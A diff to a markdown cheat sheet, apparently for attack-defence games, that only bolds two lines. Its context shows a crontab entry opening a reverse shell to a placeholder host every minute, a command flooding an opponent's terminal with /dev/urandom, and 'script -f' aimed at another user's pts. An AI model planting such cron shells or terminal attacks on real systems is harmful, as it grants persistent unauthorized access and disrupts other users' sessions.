@@ -32,7 +32,7 @@ cd .hidden_folder
 -----------------------------------------------------------------------------
 -----------------------------------------------------------------------------
 ## Use Cronjobs for automation
-> Run 'crontab -e' and paste these line
+> **Run 'crontab -e' and paste these line**
 ### Reverse shell
 ```
 * * * * * /bin/sh -i >& /dev/tcp/YOUR_IP/LISTENING_PORT 0>&1
@@ -54,7 +54,7 @@ w
 ```
 cat /dev/urandom >/dev/pts/#
 ```
->  NOTE: place opponent pts in place of '#' 
+>  **NOTE: place opponent pts in place of '#'**
 ### Using script
 ```
 script -f /dev/pts/#
